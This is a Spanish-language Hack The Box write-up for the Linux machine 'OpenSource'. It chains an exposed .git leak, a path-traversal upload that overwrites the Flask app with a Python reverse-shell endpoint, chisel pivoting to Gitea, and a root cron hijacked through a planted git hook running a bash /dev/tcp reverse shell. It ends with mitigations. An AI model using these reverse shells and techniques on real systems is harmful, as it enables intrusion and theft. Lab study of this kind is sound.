---
title: "OpenSource"
description: "Writeup de OpenSource - Hack The Box - Dificultad: Easy"
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - flask
  - werkzeug
  - git-leak
  - path-traversal
  - file-upload
  - docker
  - chisel
  - port-forwarding
  - gitea
  - git-hook
  - cron-abuse
---
# 🐧 OpenSource
> 📅 Fecha: 2026-06-01
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 18.04.5 LTS)
> 🎚️ Dificultad: Easy
> 🌐 IP: `10.129.227.140`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada Lateral](#-escalada-lateral)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
OpenSource expone una webapp Flask (`upcloud`) en el puerto 80 que permite **descargar su propio código fuente** desde `/download` — incluyendo el directorio `.git`. Revisando ramas y commits antiguos se localiza un `app/.vscode/settings.json` con credenciales hard-codeadas: `dev01:Soulless_Developer#2022`. La aplicación tiene una **vulnerabilidad de Path Traversal en el upload** (no sanitiza el `filename` del `multipart/form-data`), lo que permite sobrescribir `app/app/views.py` y añadir un endpoint `/cmd` con RCE — todo ejecutándose como `root` dentro del contenedor Docker.

Desde dentro del contenedor se levanta un túnel **chisel** hacia el host (`172.17.0.1:3000`), donde corre **Gitea**. Las credenciales del `settings.json` permiten autenticar en Gitea y descargar el repositorio privado `home-backup` del usuario `dev01`, que contiene su clave SSH privada. SSH como `dev01` → **user flag**.

`pspy` revela un cron de root que ejecuta `git-sync`, haciendo `git push origin main` desde el home de `dev01`. Como `dev01` puede escribir en `~/.git/hooks/`, plantamos un `pre-commit` con una reverse shell. La próxima ejecución del cron dispara el hook **con privilegios root** → **root flag**.

| Campo | Valor |
|-------|-------|
| Puntos débiles | `.git` expuesto, credenciales en `.vscode/settings.json`, Path Traversal en upload, contenedor root, Gitea con credenciales reutilizadas, cron root sobre git-hook escribible |
| CVEs | N/A (cadena de misconfiguraciones) |
| Herramientas | nmap, dirsearch, git, curl, chisel, ssh, pspy64, navegador |
| Tiempo total | *ver tus notas* |
---
## 🔍 Reconocimiento
### Escaneo de puertos (nmap)
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN nmap.txt 10.129.227.140
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 08:16 -0400
Nmap scan report for 10.129.227.140
Host is up (0.20s latency).
Not shown: 65279 closed tcp ports (reset), 254 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.10.3)
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 72.99 seconds
```
> 💡 **Análisis:** Solo SSH y un servidor **Werkzeug 2.1.2 + Python 3.10.3**, banner clásico de Flask. La app se llama `upcloud` y es de upload de archivos. Werkzeug en modo dev expone el debugger con `/console`, hay que comprobarlo. Y siempre con Flask vale la pena fuzzear directorios buscando endpoints sensibles.
---
## 🗂️ Enumeración
### Fuzzing de directorios con dirsearch
```bash
dirsearch -u http://10.129.227.140/
```
```text
Target: http://10.129.227.140/

[08:47:28] 200 -    2KB - /console
[08:47:40] 200 -    2MB - /download
[08:49:12] 500 -   15KB - /uploads/dump.sql
[08:49:12] 500 -   16KB - /uploads/affwp-debug.log
```
> 💡 **Análisis:** Tres descubrimientos muy jugosos:
> 1. **`/console`** — Werkzeug debugger expuesto (sin PIN si tenemos suerte; mejor no depender de él).
> 2. **`/download`** que devuelve un archivo de **2 MB** — probablemente el código fuente comprimido.
> 3. **`/uploads/`** con archivos accesibles → confirma que hay funcionalidad de subida.

### Análisis del `/download`
El archivo descargado es un ZIP con el código fuente de la aplicación. Lo descomprimo:
```bash
ls -la
```
```text
drwxrwxr-x  4.0 KB Mon Jun  1 08:53:22 2026  .
drwxrwxr-x  4.0 KB Mon Jun  1 08:52:36 2026  ..
drwxrwxr-x  4.0 KB Mon Jun  1 08:53:25 2026  .git
drwxrwxr-x  4.0 KB Thu Apr 28 07:45:52 2022  app
drwxr-xr-x  4.0 KB Thu Apr 28 07:34:45 2022  config
-rwxr-xr-x  110 B  Thu Apr 28 07:40:20 2022  build-docker.sh
-rw-rw-r--  574 B  Thu Apr 28 08:50:20 2022  Dockerfile
```
> 💡 **Análisis:** ¡Incluye el directorio **`.git`**! Esto es oro: podemos ver el historial completo de commits, ramas privadas, y secretos que se hayan commiteado y luego "borrado" en commits posteriores (el famoso `git rm secrets.txt` que no los elimina del historial).

### Historial Git
```bash
git log --oneline --all
```
```text
2c67a52 (HEAD -> public) clean up dockerfile for production use
c41fede (dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial
```
> 💡 **Análisis:** Hay una **rama `dev`** separada del `public`. El mensaje `clean up dockerfile for production use` sugiere que en el commit `2c67a52` se limpiaron secretos antes de hacer público el repo. Hay que ir a commits **anteriores** a buscar lo que se quitó.

### Inspección del commit `a76f8f7`
```bash
git checkout a76f8f75f7a4a12b706b0cf9c983796fa1985820
cd app/.vscode && cat settings.json
```
```text
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```
> 💡 **Análisis crítico:** En el `settings.json` de VSCode hay credenciales hard-codeadas: **`dev01:Soulless_Developer#2022`**. La URL apunta a una IP interna (`10.10.10.128`) que no es accesible directamente desde aquí, pero las credenciales en sí son reutilizables. Hay que guardarlas para más tarde.
---
## 🚪 Explotación Inicial (Foothold)
### Vector: Path Traversal en el upload + sobrescritura de `views.py`
Inspeccionando el código de la app, el endpoint `/upcloud` recibe un `multipart/form-data` y guarda el archivo respetando **el `filename` sin sanitizar**. Como Flask corre en el contenedor con permisos altos sobre `/app/`, podemos sobrescribir el propio código de la aplicación. El plan: añadir un endpoint `/cmd` al `views.py` que ejecute lo que le pasemos.

### Creación del payload
Edito `app/app/views.py` localmente añadiendo un endpoint de RCE y otro de reverse shell:
```python
@app.route('/shell')
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.15.71", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/sh")
    return "ok"
```

### Upload con Path Traversal en el filename
La clave está en el parámetro `filename=` del formulario:
```bash
curl -X POST http://10.129.227.140/upcloud \
  -F "file=@app/app/views.py;filename=/app/app/views.py"
```
```text
<html lang="en">
[...]
<div class="drag-area">
    <h3>Success!</h3>
    <p>Your <a href="http://10.129.227.140/uploads//app/app/views.py">file</a> has been uploaded.</p>
[...]
```
> 💡 **Análisis:** El servidor responde "Success!" — la sobrescritura funcionó. Como Werkzeug en modo dev recarga automáticamente al cambiar un `.py`, el nuevo endpoint debería estar disponible inmediatamente sin reiniciar nada.

### Confirmación de RCE
```bash
curl 'http://10.129.227.140/cmd?cmd=id'
```
```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
> 💡 **Análisis:** **Somos root dentro del contenedor Docker**. La pista de los grupos (`bin`, `daemon`, `sys`, `wheel`...) es típica de Alpine/distroless: estamos en una imagen base sin GUI. Esto no es "root real" — es root del contenedor. Hay que escapar al host.

### Reverse shell estable
Lanzamos `/shell` (que ya pusimos en `views.py`) para tener una shell interactiva:
```bash
# Terminal 1 - listener
nc -lvnp 4444

# Terminal 2 - trigger
curl http://10.129.227.140/shell
```
> 💡 **Análisis:** Estamos dentro del contenedor. Para escapar necesitamos ver qué hay alrededor — la IP del Docker bridge (`172.17.0.1`) suele ser el host, y normalmente expone servicios internos no accesibles desde fuera.
---
## 🔄 Escalada Lateral
### Pivot al host con Chisel
Desde el contenedor, levantamos un cliente chisel que abre un túnel reverso hacia nuestro atacante. Esto nos permitirá hablar con servicios del host (`172.17.0.1`) desde nuestra máquina.

**Atacante — servidor chisel:**
```bash
./chisel server -p 1234 --reverse
```
```text
2026/06/01 12:56:12 server: Reverse tunnelling enabled
2026/06/01 12:56:12 server: Fingerprint zzuLwKB8nQVrClaJ8UF2NgFuOaIHMo8iFkr3c8VAY4Y=
2026/06/01 12:56:12 server: Listening on http://0.0.0.0:1234
```

**Atacante — servir el binario:**
```bash
python3 -m http.server 8000
```
```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.227.140 - - [01/Jun/2026 12:55:36] "GET /chisel HTTP/1.1" 200 -
```

**Víctima (contenedor) — descargar y conectar:**
```bash
/tmp # uname -m
x86_64
/tmp # wget http://10.10.15.71:8000/chisel_amd64 -O /tmp/chisel2
/tmp # chmod +x /tmp/chisel2
/tmp # /tmp/chisel2 client 10.10.15.71:1234 R:3000:172.17.0.1:3000
```
```text
2026/06/01 16:57:33 client: Connecting to ws://10.10.15.71:1234
2026/06/01 16:57:34 client: Connected (Latency 160.611898ms)
```
**Server log:**
```text
2026/06/01 12:57:47 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```
> 💡 **Análisis:** Ahora `localhost:3000` en mi atacante ↔ `172.17.0.1:3000` en el contenedor (que es el host). Visitando `http://localhost:3000` en mi navegador, aparece una instancia de **Gitea**.

### Login en Gitea con las credenciales del settings.json
Las credenciales `dev01:Soulless_Developer#2022` autentican en Gitea. Allí hay un repositorio privado llamado **`home-backup`** del usuario `dev01`. Descargo el ZIP de la rama main desde la UI de Gitea.

### Inspección del backup del home de dev01
```bash
unzip home-backup-main.zip
```
```text
Archive:  home-backup-main.zip
   creating: home-backup/
    linking: home-backup/.bash_history  -> /dev/null
  inflating: home-backup/.bash_logout
  inflating: home-backup/.bashrc
   creating: home-backup/.cache/
  inflating: home-backup/.profile
   creating: home-backup/.ssh/
  inflating: home-backup/.ssh/authorized_keys
  inflating: home-backup/.ssh/id_rsa
  inflating: home-backup/.ssh/id_rsa.pub
```
> 💡 **Análisis:** El backup contiene **`.ssh/id_rsa`** de dev01. Combinado con `authorized_keys`, podemos autenticarnos por SSH directamente al host.

### Acceso SSH como dev01 — user flag
```bash
cd home-backup/.ssh
chmod 600 id_rsa
ssh -i id_rsa dev01@10.129.227.140
```
```text
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)
[...]
  IP address for eth0:    10.129.227.140
  IP address for docker0: 172.17.0.1
[...]
Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$
```
📸 *Captura: shell SSH como `dev01` en el host real (no en el contenedor).*

> ⚠️ **TODO:** falta el `cat user.txt` en tus notas. Sugiero añadirlo aquí cuando lo tengas anotado.
---
## 🚀 Escalada de Privilegios
### Enumeración con pspy64
Subo `pspy64` al host para ver procesos sin necesitar root:
```bash
dev01@opensource:~$ wget http://10.10.15.71:8000/pspy64 -O /tmp/pspy64
dev01@opensource:~$ chmod +x /tmp/pspy64
dev01@opensource:~$ /tmp/pspy64
```
**Salida filtrada (lo relevante):**
```text
2026/06/01 17:42:09 CMD: UID=0  PID=27355  | /bin/sh -c /usr/local/bin/git-sync
2026/06/01 17:42:09 CMD: UID=0  PID=27359  | /bin/bash /usr/local/bin/git-sync
2026/06/01 17:42:09 CMD: UID=0  PID=27372  | git push origin main
2026/06/01 17:42:09 CMD: UID=0  PID=27373  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
2026/06/01 17:42:09 CMD: UID=0  PID=27351  | /usr/sbin/CRON -f
```
> 💡 **Análisis crítico:** Hay un **cron de root** que ejecuta periódicamente `/usr/local/bin/git-sync`, el cual hace `git push origin main` contra el repositorio `home-backup` del Gitea. Esto significa que el cron entra en el directorio del repo (probablemente `/home/dev01/home-backup/` o similar) y ejecuta operaciones git **como root**.
>
> Aquí está la vulnerabilidad: **git ejecuta hooks** durante operaciones como `commit`, `push`, `checkout`, etc. Los hooks viven en `.git/hooks/` y son scripts ejecutables. Si el repo está bajo el control de un usuario menos privilegiado (`dev01`), pero un proceso root entra ahí y dispara un comando que invoca hooks, **el hook se ejecuta como root**.

### Vector: Git hook hijack
El hook `pre-commit` se ejecuta justo antes de cualquier commit. Aunque el cron hace `git push` (no commit), git puede disparar otros hooks como `pre-push`, `post-update`, `prepare-commit-msg` según la versión y configuración. En este caso, plantar **`pre-commit`** suele bastar porque git-sync probablemente hace un `git add` + `commit` + `push`.

```bash
dev01@opensource:~$ cat > ~/.git/hooks/pre-commit << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.71/5555 0>&1
EOF
dev01@opensource:~$ chmod +x ~/.git/hooks/pre-commit
```
> 💡 **Análisis:** El hook se ejecuta como root porque `git-sync` opera en el repo de dev01 con privilegios root. La reverse shell hereda esos privilegios.

### Listener y disparo del cron
```bash
nc -lvnp 5555
```
```text
listening on [any] 5555 ...
connect to [10.10.15.71] from (UNKNOWN) [10.129.227.140] 36912
bash: cannot set terminal process group (27995): Inappropriate ioctl for device
bash: no job control in this shell
root@opensource:/home/dev01# id
uid=0(root) gid=0(root) groups=0(root)
root@opensource:~# cat /root/root.txt
[root flag]
```
📸 *Captura: shell root con lectura de `root.txt`.*

> 💡 **Análisis:** El cron se ejecuta cada pocos minutos. Al disparar git-sync → `git add` → `git commit` (que invoca `pre-commit` hook) → reverse shell como root.
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt | `[user flag]` *(no pegada en las notas — actualizar)* |
| root.txt | `[root flag]` |
---
## 🎓 Lecciones Aprendidas
- **Servir el `.git` al público es revelar todo el historial.** Cualquier commit reciente, cualquier rama, cualquier secreto que se "borró" sigue ahí. Comandos clave: `git log --all`, `git reflog`, `git show <commit>`, y herramientas como `gitleaks` o `trufflehog` para automatizar.
- **`.vscode/settings.json` es uno de los mayores leakers de credenciales** del mundo del desarrollo. La gente pone proxies, conexiones SSH, conexiones a DBs ahí pensando que es "local" y luego lo commitea. Siempre revisar este archivo si aparece en el repo.
- **Path Traversal en el `filename` del multipart**: no fiarse nunca del nombre que envía el cliente. La librería estándar (`werkzeug.secure_filename`, `os.path.basename`) existe precisamente para esto. La validación correcta es: (1) `secure_filename`, (2) generar un UUID y descartar el nombre original, (3) restringir el directorio destino con `os.path.realpath` y comprobar que está dentro del whitelist.
- **Docker no es una sandbox de seguridad por defecto.** Un proceso root dentro del contenedor sigue siendo root, y si tiene `network_mode=bridge` puede hablar libremente con el host vía `172.17.0.1`. Aquí Gitea estaba expuesto solo en el host pero accesible desde el contenedor — un patrón de red común que rara vez se piensa.
- **Chisel es la herramienta más útil para pivoting moderno.** Un binario estático, sin dependencias, funciona en cualquier sitio donde puedas ejecutar un ELF. Memorizar la sintaxis: `server -p X --reverse` / `client server-ip:X R:local-port:remote-host:remote-port`.
- **Git hooks ejecutados por procesos privilegiados = LPE clásica.** Cualquier cron, systemd timer o script de despliegue que entre en un repo controlado por usuario y dispare comandos git es vulnerable. La defensa correcta es ejecutar git con `--no-verify` o configurar `core.hooksPath` apuntando a una ubicación protegida.

### Mitigaciones (lado defensivo)
1. **Excluir `.git/` del despliegue** vía `.dockerignore`, `.gitignore` del build, o configuración del web server (`location ~ /\.git { deny all; }` en nginx).
2. **Sanitizar uploads**: `secure_filename` + UUID + `os.path.join(SAFE_DIR, ...)` + `os.path.commonpath`.
3. **Imágenes Docker que no corran como root**: añadir `USER nobody` al Dockerfile, usar imágenes distroless con UID no privilegiado.
4. **Aislar el contenedor del host**: no permitir que el contenedor hable con `172.17.0.1` salvo a servicios estrictamente necesarios. Usar redes Docker custom (`--network`) en lugar del bridge default.
5. **No reutilizar credenciales** entre Gitea, SSH y proxy. Cada servicio debería tener su propia credencial rotable.
6. **Para crons que tocan repos git**: usar `git -c core.hooksPath=/dev/null` para deshabilitar hooks, o ejecutar git como un usuario dedicado sin acceso al filesystem del repo de usuario.

---
## 📚 Referencias
- [HackTricks - Flask debugger / PIN bypass](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
- [HackTricks - Git hooks abuse](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#git-abuse)
- [HackTricks - Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [chisel - TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)
- [Gitea - Self-hosted Git service](https://gitea.com/)
- [pspy - unprivileged process snooping](https://github.com/DominicBreuker/pspy)
- [Werkzeug Documentation](https://werkzeug.palletsprojects.com/)
- [Git hooks reference](https://git-scm.com/docs/githooks)